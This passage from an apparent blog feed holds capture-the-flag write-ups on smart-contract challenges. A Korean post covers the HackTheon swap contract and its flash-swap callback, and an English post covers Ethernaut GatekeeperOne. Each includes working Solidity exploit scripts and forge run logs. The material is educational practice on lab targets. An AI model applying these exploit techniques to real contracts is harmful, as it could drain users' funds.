class=\"n\">_from</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">_amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>      <span class=\"kt\">uint</span> <span class=\"n\">balanceBefore</span> <span class=\"o\">=</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">_from</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">));</span>      <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">_from</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">_amount</span><span class=\"p\">);</span>        <span class=\"n\">IUniswapV2Callee</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">uniswapV2Call</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">amount0Out</span><span class=\"p\">,</span> <span class=\"n\">amount1Out</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"p\">);</span>      <span class=\"kt\">uint</span> <span class=\"n\">balanceAfter</span> <span class=\"o\">=</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">_from</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">));</span>      <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balanceAfter</span> <span class=\"o\">&gt;=</span> <span class=\"n\">balanceBefore</span><span class=\"p\">);</span>    <span class=\"p\">}</span>  <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">swap</code> Ìï®ÏàòÏóêÏÑú Ï†ÑÎã¨Î∞õÏùÄ <code class=\"language-plaintext highlighter-rouge\">amount0Out</code> Î≥ÄÏàòÎ•º ÌÜµÌï¥ 0Ïù∏ÏßÄ ÏïÑÎãåÏßÄÏóê Îî∞Îùº <code class=\"language-plaintext highlighter-rouge\">wETH</code>ÏóêÏÑú <code class=\"language-plaintext highlighter-rouge\">htoTokend</code>ÏúºÎ°ú Î≥¥ÎÇºÏßÄ, <code class=\"language-plaintext highlighter-rouge\">htoToken</code>ÏóêÏÑú <code class=\"language-plaintext highlighter-rouge\">wETH</code>Î°ú Î≥¥ÎÇºÏßÄÎ•º Í≤∞Ï†ïÌïòÍ≥† ÏûàÎã§.</p><p>Í∑∏ Îã§Ïùå  <code class=\"language-plaintext highlighter-rouge\">data.length</code> Í∞Ä 0Ïù¥Î©¥ <code class=\"language-plaintext highlighter-rouge\">to</code>Î°ú Î®ºÏ†Ä <code class=\"language-plaintext highlighter-rouge\">_to</code>Ïùò ÌÜ†ÌÅ∞ÏùÑ Î≥¥ÎÇ∏ Îí§, <code class=\"language-plaintext highlighter-rouge\">_from</code>  ÏúºÎ°ú Î∂ÄÌÑ∞ ÌÜ†ÌÅ∞ÏùÑ Î∞õÏïÑÏò®Îã§.</p><p>Ïó¨Í∏∞ÏÑú Checks-Effectes Interaction Ìå®ÌÑ¥Ïù¥ Ï†ÅÏö©ÎêòÏßÄ ÏïäÏïÑ <code class=\"language-plaintext highlighter-rouge\">_to</code>Ïùò ÌÜ†ÌÅ∞ÏùÑ Î®ºÏ†Ä Î≥¥ÎÇ∏ Îí§, <code class=\"language-plaintext highlighter-rouge\">_from</code> Ïùò ÌÜ†ÌÅ∞ÏùÑ Î∞õÏïÑÏò§Í≥† ÏûàÏñ¥ <code class=\"language-plaintext highlighter-rouge\">_from</code>Ïùò ÌÜ†ÌÅ∞Ïù¥ Ï∂©Î∂ÑÌïòÏßÄ ÏïäÏïÑÎèÑ Í∞íÏùÑ Î≥¥ÎÇº Ïàò ÏûàÏñ¥ Î≥¥Ïù∏Îã§.</p><h3 id=\"transferfrom-Ìï®Ïàò\">transferFrom Ìï®Ïàò</h3><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">virtualreturns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"n\">spender</span> <span class=\"o\">=</span> <span class=\"n\">_msgSender</span><span class=\"p\">();</span>    <span class=\"n\">_spendAllowance</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"n\">_transfer</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">transferFrom</code>  Ìï®ÏàòÎäî Îã§ÏùåÍ≥º Í∞ôÏúºÎ©∞ ÏïÑÍπåÏùò <code class=\"language-plaintext highlighter-rouge\">mint</code> Ìï®ÏàòÏôÄ Í∞ôÏù¥</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"n\">_transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">from</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"nb\">revert</span> <span class=\"n\">ERC20InvalidSender</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">to</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"nb\">revert</span> <span class=\"n\">ERC20InvalidReceiver</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"n\">_update</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">_transfer</code> Ìï®ÏàòÎ•º Í±∞Ï≥ê <code class=\"language-plaintext highlighter-rouge\">_update</code> Ìï®ÏàòÎ°ú ÏßÑÏûÖÌïúÎã§.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"n\">_update</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"k\">virtual</span> <span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">from</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"c1\">// Overflow check required: The rest of the code assumes thattotalSupply never overflows</span>        <span class=\"n\">_totalSupply</span> <span class=\"o\">+=</span> <span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">fromBalance</span> <span class=\"o\">=</span> <span class=\"n\">_balances</span><span class=\"p\">[</span><span class=\"n\">from</span><span class=\"p\">];</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">fromBalance</span> <span class=\"o\">&lt;</span> <span class=\"n\">value</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span> <span class=\"n\">ERC20InsufficientBalance</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">fromBalance</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"p\">}</span>        <span class=\"kr\">unchecked</span> <span class=\"p\">{</span>            <span class=\"c1\">// Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span>            <span class=\"n\">_balances</span><span class=\"p\">[</span><span class=\"n\">from</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">fromBalance</span> <span class=\"o\">-</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">to</span> <span class=\"o\">==</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"kr\">unchecked</span> <span class=\"p\">{</span>            <span class=\"c1\">// Overflow not possible: value &lt;= totalSupply or value &lt;=fromBalance &lt;= totalSupply.</span>            <span class=\"n\">_totalSupply</span> <span class=\"o\">-=</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>        <span class=\"kr\">unchecked</span> <span class=\"p\">{</span>            <span class=\"c1\">// Overflow not possible: balance + value is at most totalSupply,which we know fits into a uint256.</span>            <span class=\"n\">_balances</span><span class=\"p\">[</span><span class=\"n\">to</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">emit</span> <span class=\"n\">Transfer</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">value</span><span class=\"p\">);</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">_update</code> Ìï®ÏàòÏóêÏÑú ÌÜ†ÌÅ∞Ïù¥ Î≥¥ÎÇ¥Î†§Í≥† ÌïòÎäî Í∞íÎ≥¥Îã§ Ï†ÅÏùÄ Í≤ΩÏö∞ÏùºÎïå 8Î≤àÏß∏ Ï§ÑÏóêÏÑú <code class=\"language-plaintext highlighter-rouge\">revert</code> ÌïòÍ≥† ÏûàÏúºÎØÄÎ°ú solidityÏùò ÏõêÏûêÏÑ±Ïóê ÏùòÌï¥ ÌÜ†ÌÅ∞Ïù¥ Ï∂©Î∂ÑÌïòÏßÄ ÏïäÏùÑ Îïå Î∞úÏÉùÌï† Ïàò ÏûàÎäî Ï∑®ÏïΩÏ†êÏùÄ ÏóÜÏñ¥ Î≥¥Ïù∏Îã§.</p><hr /><p><code class=\"language-plaintext highlighter-rouge\">_getExchange</code> Ìï®ÏàòÎ•º Î≥¥Î©¥ <code class=\"language-plaintext highlighter-rouge\">wETH</code>ÏóêÏÑú  <code class=\"language-plaintext highlighter-rouge\">htoToken</code> ÏúºÎ°ú Î≥¥ÎÇº ÎïåÎäî ÌÜ†ÌÅ∞ÏùÑ 2Î∞∞Î°ú Î≥¥ÎÇ¥ÏßÄÎßå, Î∞òÎåÄÏùº ÎïåÎäî 1/2Î∞∞ Î≥¥ÎÇ¥Îäî Í≤ÉÏùÑ Î≥º Ïàò ÏûàÎã§.</p><p><code class=\"language-plaintext highlighter-rouge\">data.length</code> Í∞Ä 0Ïù¥ ÏïÑÎãå Í≤ΩÏö∞ÏóêÎäî <code class=\"language-plaintext highlighter-rouge\">_from</code> ÌÜ†ÌÅ∞Ïùò Í∞úÏàòÎ•º <code class=\"language-plaintext highlighter-rouge\">balanceBefore</code> Î≥ÄÏàòÏóê Ï†ÄÏû•Ìïú Îí§, ÌÜ†ÌÅ∞ÏùÑ Î≥¥ÎÇ∏Îã§.</p><p>Ïù¥ÌõÑ IUniswapV2Callee contractÏùò  <code class=\"language-plaintext highlighter-rouge\">uniswapV2Call</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≥† ÏûàÎã§.</p><h3 id=\"uniswapv2call-Ìï®Ïàò\">uniswapV2Call Ìï®Ïàò</h3><hr /><p>Íµ¨Í∏ÄÎßÅÏùÑ ÌÜµÌï¥ Î¨∏ÏÑúÎ•º Ï∞æÏùÑ Ïàò ÏûàÏóàÎã§.</p><p><a href=\"https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps\">Flash Swaps Uniswap</a></p><p>flash loanÏù¥ Í∞ÄÎä•ÌïòÍ≤å ÌïòÍ≥† ÏûàÏóàÍ≥† Ïù¥Ï†Ñ <code class=\"language-plaintext highlighter-rouge\">data.length</code>Í∞Ä 0ÏùºÎïå Í∏∞Îä•Í≥º ÌÅ¨Í≤å Ï∞®Ïù¥Í∞Ä ÎÇòÎ≥¥Ïù¥ÏßÄ ÏïäÎäîÎã§.</p><hr /><p>SwapÏùÑ ÌÜµÌï¥ wETHÏùò <code class=\"language-plaintext highlighter-rouge\">balanceOf</code>Î•º 100000000 Ïù¥ÏÉÅÏúºÎ°ú ÎßåÎì† Îí§ FLAGÎ•º Ïö∞ÏÑ† ÏñªÎäîÎã§Î©¥ ÌõÑÏóê <code class=\"language-plaintext highlighter-rouge\">swap</code> Ìï®ÏàòÏóêÏÑú <code class=\"language-plaintext highlighter-rouge\">revert</code> Í∞Ä Î∞úÏÉùÌïòÏó¨ÎèÑ FLAGÎ•º ÏñªÏùÑ Ïàò ÏûàÎã§.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: UNLICENSED</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">20</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">IUniswapV2Callee</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/Swap.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">Swap</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/Swap.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"n\">WETH</span> <span class=\"p\">}</span> <span class=\"n\">from</span> <span class=\"s\">\"../src/WETH.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"k\">is</span> <span class=\"n\">IUniswapV2Callee</span> <span class=\"p\">{</span>    <span class=\"n\">Swap</span> <span class=\"k\">public</span> <span class=\"n\">swap_</span> <span class=\"o\">=</span> <span class=\"n\">Swap</span><span class=\"p\">(</span><span class=\"mh\">0x8A791620dd6260079BF849Dc5567aDC3F2FdC318</span><span class=\"p\">);</span>    <span class=\"n\">WETH</span> <span class=\"k\">public</span> <span class=\"n\">weth_</span> <span class=\"o\">=</span> <span class=\"n\">WETH</span><span class=\"p\">(</span><span class=\"mh\">0x5FbDB2315678afecb367f032d93F642f64180aa3</span><span class=\"p\">);</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"kr\">immutable</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"kt\">string</span> <span class=\"k\">public</span> <span class=\"n\">flag</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"k\">try</span> <span class=\"n\">swap_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"mi\">100</span><span class=\"n\">_000_001</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">\"mingw\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"p\">}</span> <span class=\"k\">catch</span> <span class=\"p\">{</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">uniswapV2Call</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">,</span> <span class=\"kt\">uint</span> <span class=\"n\">amount0Out</span><span class=\"p\">,</span> <span class=\"kt\">uint</span><span class=\"p\">,</span> <span class=\"kt\">bytes</span> <span class=\"k\">calldata</span><span class=\"p\">)</span> <span class=\"k\">external</span> <span class=\"k\">override</span> <span class=\"p\">{</span>        <span class=\"n\">flag</span> <span class=\"o\">=</span> <span class=\"n\">weth_</span><span class=\"p\">.</span><span class=\"n\">flag</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"FLAG: \"</span><span class=\"p\">,</span> <span class=\"n\">flag</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Exploit</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">();</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>ÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÎçò ÎèÑÏ§ë <code class=\"language-plaintext highlighter-rouge\">swap</code> Ìï®ÏàòÏóêÏÑú <code class=\"language-plaintext highlighter-rouge\">uniswapV2Call</code> Ìï®ÏàòÍ∞Ä Íµ¨Ï≤¥Ï†ÅÏúºÎ°ú Ï†ïÏùòÍ∞Ä ÎêòÏñ¥ÏûàÎäîÍ≤ÉÏù¥ ÏïÑÎãå <code class=\"language-plaintext highlighter-rouge\">interface</code>Î•º ÌÜµÌï¥ Ìò∏Ï∂úÎêòÏñ¥ ÏûàÏóàÍ≥† <code class=\"language-plaintext highlighter-rouge\">override</code>Ìï¥ÏÑú FLAGÏùò Í∞íÏùÑ Î∂àÎü¨Ïò¨ Ïàò ÏûàÏóàÎã§.<code class=\"language-plaintext highlighter-rouge\">receive</code>Î°ú ÌíÄÏù¥ÌïòÎäî Í≤ÉÎ≥¥Îã§ <code class=\"language-plaintext highlighter-rouge\">override</code> Î•º ÌÜµÌï¥  FLAG Í∞íÏùÑ Í∞ÄÏ†∏Ïò§ÎèÑÎ°ù Ìïú Îí§ <code class=\"language-plaintext highlighter-rouge\">swap</code> Ìï®ÏàòÎäî Ïò§Î•òÍ∞Ä Î∞úÏÉùÌïòÏßÄÎßå ÏÉÅÍ¥Ä ÏóÜÏù¥ try catchÎ°ú ÎÇ†Î†§ Ï£ºÏóàÎã§.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/Exploit.sol:Exploit <span class=\"nt\">--broadcast</span> <span class=\"nt\">--rpc-url</span> http://127.0.0.1:12455 <span class=\"nt\">--private-key</span> 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d<span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>260.23msCompiler run successful with warnings:Warning <span class=\"o\">(</span>5667<span class=\"o\">)</span>: Unused <span class=\"k\">function </span>parameter. Remove or comment out the variable name to silence this warning.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/Exploit.sol:24:37:   |24 |     <span class=\"k\">function </span>uniswapV2Call<span class=\"o\">(</span>address, uint amount0Out, uint, bytes calldata<span class=\"o\">)</span> external override <span class=\"o\">{</span>   |                                     ^^^^^^^^^^^^^^^Warning <span class=\"o\">(</span>2018<span class=\"o\">)</span>: Function state mutability can be restricted to pure  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> src/Swap.sol:23:3:   |23 |   <span class=\"k\">function </span>_getExchange<span class=\"o\">(</span>uint amount0Out, uint amount1Out<span class=\"o\">)</span> public returns <span class=\"o\">(</span>uint<span class=\"o\">)</span> <span class=\"o\">{</span>   |   ^ <span class=\"o\">(</span>Relevant <span class=\"nb\">source </span>part starts here and spans across multiple lines<span class=\"o\">)</span><span class=\"nb\">.</span>Warning: Detected artifacts built from <span class=\"nb\">source </span>files that no longer exist. Run <span class=\"sb\">`</span>forge clean<span class=\"sb\">`</span> to make sure builds are <span class=\"k\">in </span><span class=\"nb\">sync </span>with project files. - /home/mingw/contract-hacktheon/script/ExploitScript.s.solScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  FLAG:  FLAG<span class=\"o\">{</span>THIS_IS_FAKE_FLAG<span class=\"o\">}</span><span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 31337Estimated gas price: 0.266981935 gweiEstimated total gas used <span class=\"k\">for </span>script: 1313610Estimated amount required: 0.00035071013963535 ETH<span class=\"o\">==========================</span><span class=\"c\">##### anvil-hardhat</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xed31043ebf8e104ee72068750450bea6779c95b68cacf202df7e6c2e7c41f481Block: 19Paid: 0.000012110491581919 ETH <span class=\"o\">(</span>117379 gas <span class=\"k\">*</span> 0.103174261 gwei<span class=\"o\">)</span><span class=\"c\">##### anvil-hardhat</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x77ee82294078a8cce1ff60eb0bce0a09e5056650195371a1cad40f96c73d5339Contract Address: 0x0f5D1ef48f12b6f691401bfe88c2037c690a6afeBlock: 18Paid: 0.000102718077731487 ETH <span class=\"o\">(</span>878419 gas <span class=\"k\">*</span> 0.116935173 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on anvil-hardhat | Total Paid: 0.000114828569313406 ETH (995798 gas * avg 0.110054717 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/04/27/hacktheon-contact",
            
            
            
            "tags": ["blockchain","HackTheon","foundry","contract","flashloan"],
            
            "date_published": "2025-04-27T00:00:00+09:00",
            "date_modified": "2025-04-27T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/22/gatekeeper-one",
            "title": "[Ethernaut] GateKeeper One",
            "summary": null,
            "content_text": "AnalysisThe goal is  Make it past the gatekeeper and register as an entrant to pass this level.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne {    address public entrant;    modifier gateOne() {        require(msg.sender != tx.origin);        _;    }    modifier gateTwo() {        require(gasleft() % 8191 == 0);        _;    }    modifier gateThree(bytes8 _gateKey) {        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");        require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");        _;    }    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {        entrant = tx.origin;        return true;    }}Solidity 0.8.30 Documentation - units and global variables  üí° gasleft()¬†returns¬†(uint256): remaining gasSolidity 0.8.30 Documentation - external function calls  üí° When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options¬†{value:¬†10,¬†gas:¬†10000}. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GateKeeperOne.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    function ex(GatekeeperOne gko_) external returns (uint){        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;        for(uint i=0; i&lt;=350; i++) {            (bool result,) = address(gko_).call{gas: i+(8191*3)}(abi.encodeWithSignature(\"enter(bytes8)\", gateKey));            if(result) {                return i;            }        }    }}contract GateKeeperOneSol is Script {    GatekeeperOne public gko_ = GatekeeperOne(0x8905857EFf6E619C391C6a828B62F86f2D15CCf8);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));            console.log(\"Before entrant: \", gko_.entrant());        Ex ex = new Ex();        console.log(\"gas: \", ex.ex(gko_));        console.log(\"After entrant: \", gko_.entrant());        vm.stopBroadcast();    }}$ forge script script/GateKeeperOneSol.sol --tc GateKeeperOneSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before entrant:  0x0000000000000000000000000000000000000000  gas:  256  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001016731 gweiEstimated total gas used for script: 987058Estimated amount required: 0.000001003572467398 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7Block: 3700680Paid: 0.000000434849804628 ETH (427697 gas * 0.001016724 gwei)##### holesky‚úÖ  [Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3Block: 3700680Paid: 0.000000282768228708 ETH (278117 gas * 0.001016724 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Make it past the gatekeeper and register as an entrant to pass this level.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GatekeeperOne</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">entrant</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateOne</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateTwo</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"nb\">gasleft</span><span class=\"p\">()</span> <span class=\"o\">%</span> <span class=\"mi\">8191</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span 